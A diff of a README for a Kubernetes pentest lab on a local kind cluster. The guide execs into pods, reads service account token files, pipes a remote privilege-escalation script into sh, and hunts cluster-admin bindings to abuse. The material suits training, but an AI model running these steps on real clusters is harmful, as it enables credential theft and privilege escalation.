@@ -11,15 +11,15 @@
 
 ## First Steps
 
-Create your first cluster
+#### Create your first cluster
 
     kind create cluster --name <name>
 
-See what`s in there
+#### See what`s in there
 
     kubectl get pods -A
 
-Excected results.. this means YAY! 🔆
+#### Excected results.. this means YAY! 🔆
 
     kube-system             coredns-7db6d8ff4d-c4tsh                              1/1     Running            9 (19m ago)    154d
     kube-system             coredns-7db6d8ff4d-rjvkx                              1/1     Running            9 (19m ago)    154d
@@ -33,20 +33,20 @@ Excected results.. this means YAY! 🔆
 
 ## Playing Around
 
-Deploy simple pod
+#### Deploy simple pod
 
     kubectl run nginx1 -n open --image=nginx:latest
 
-Deploy simple pod via YAML
+#### Deploy simple pod via YAML
 
     kubectl apply -f pod-config.yaml
 
-Exec into the container
+#### Exec into the container
 
     kubectl exec --stdin --tty nginx1 -n open -- /bin/sh 
     kubectl exec --stdin --tty nginx1 -n open -- /bin/bash
 
-And things to do inside the container 👾
+#### And things to do inside the container 👾
 
     id
     uname -a
@@ -58,21 +58,21 @@ And things to do inside the container 👾
     cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
     cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 
-Checks Unix system for simple privilege escalations - Cron 👾
+#### Checks Unix system for simple privilege escalations - Cron 👾
 
     curl https://raw.githubusercontent.com/hexobandit/knowledge-db/refs/heads/main/check_cron_access.sh | sh
 
-Checks Unix system for simple privilege escalations - Pentest Monkey 👾
+#### Checks Unix system for simple privilege escalations - Pentest Monkey 👾
 
     curl https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/refs/heads/1_x/unix-privesc-check > unix-privesc-check.sh
     chmod +x unix-privesc-check.sh
     ./unix-privesc-check.sh
 
-Inspect Container 👾
+#### Inspect Container 👾
 
     cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained
 
-Let's try to download `kubectl` 👾
+#### Let's try to download `kubectl` 👾
 
     export PATH=/tmp:$PATH
     cd /tmp
@@ -91,15 +91,18 @@ Error from server (Forbidden): deployments.apps is forbidden: User "system:servi
 
 By default, kubectl will attempt to use the default service account in `/var/run/secrets/kubernetes.io/serviceaccount` which might not have needed rights.
 
-Another fun way to see what you can do:
+#### Another fun way to see what you can do:
 
     kubectl auth can-i create pods
 
-Ok, let's hunt for the 'cluster-admin' role 🎅
+## Hunting For Cluster-Admin Role 🎅
+Ok, let's go one step back, exit the container and hunt for the `cluster-admin` role binding to see which objects are binded to that. The goal is to find pods with `ServiceAccount` binded to `cluster-admin` role so we could exec into that container and try to abuse that further. 
+
+#### First, filter for cluster-admin Role
 
     kubectl get clusterrolebindings -o yaml | grep -B 5 -A 5 "name: cluster-admin"
 
-This will get us:
+#### This will get us:
 
 ```
     annotations:
@@ -147,6 +150,31 @@ This will get us:
     name: kubeadm:cluster-admins
 - apiVersion: rbac.authorization.k8s.io/v1
 ```
+
+#### Let's go through the results, we see:
+
+Privileged Entities:
+  - system:masters (default superusers)
+  - kustomize-controller ServiceAccount in flux-system namespace
+  - kubeadm:cluster-admins group
+
+So let's say we cannot do anything about the user access and groups.. 
+  - So let's focus on the `ServiceAccount`
+  - And locate pods using `kustomize-controller` for potential exploitation or abuse.
+
+#### Identify Pods Using the `kustomize-controller` `ServiceAccount`:
+
+    kubectl get pods -n flux-system --field-selector spec.serviceAccountName=kustomize-controller
+
+#### And we get our pod: 
+
+
+
+
+
+
+
+
 
 ## More Than One Cluster?
 See all existting clusters
